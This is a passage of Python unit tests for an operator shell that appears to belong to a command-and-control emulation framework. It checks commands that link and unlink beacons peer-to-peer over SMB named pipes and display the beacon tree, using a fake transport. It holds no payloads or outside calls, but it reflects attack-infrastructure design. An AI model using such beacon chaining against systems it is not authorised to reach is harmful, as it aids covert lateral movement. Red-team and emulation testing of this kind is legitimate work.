                    "parent": data["parent"],
                    "child": data["child"],
                    "transport": data["transport"],
                },
            }
        if data["cmd"] == "p2p_unlink":
            return {"status": "ok", "data": {"child": data["child"]}}
        return {"status": "error", "message": "unexpected command"}


class TestP2PEmulationCommands:
    """Unit tests for operator shell P2P emulation commands."""

    def test_handler_map_includes_p2p_commands(self) -> None:
        shell = OperatorShell()
        assert shell._get_handler("link") == shell._cmd_link
        assert shell._get_handler("unlink") == shell._cmd_unlink
        assert shell._get_handler("p2p_tree") == shell._cmd_p2p_tree

    def test_completion_includes_p2p_commands(self) -> None:
        shell = OperatorShell()
        commands = shell._get_handler_map()
        assert "link" in commands
        assert "unlink" in commands
        assert "p2p_tree" in commands

    def test_link_and_unlink_send_emulation_commands(self) -> None:
        shell = OperatorShell()
        transport = _FakeTransport()
        shell.transport = transport
        shell._beacon_ids = ["parent1", "child1"]

        asyncio.run(shell._cmd_link(["parent", "child", "smb_named_pipe"]))
        asyncio.run(shell._cmd_unlink(["child"]))

        assert transport.sent == [
            {
                "cmd": "p2p_link",
                "parent": "parent1",
                "child": "child1",
                "transport": "smb_named_pipe",
            },
            {"cmd": "p2p_unlink", "child": "child1"},
        ]

    def test_p2p_tree_reads_emulated_topology(self) -> None:
        shell = OperatorShell()
        transport = _FakeTransport()
        shell.transport = transport

        asyncio.run(shell._cmd_p2p_tree([]))

        assert transport.sent == [{"cmd": "p2p_tree"}]


if __name__ == "__main__":
    entry_point()
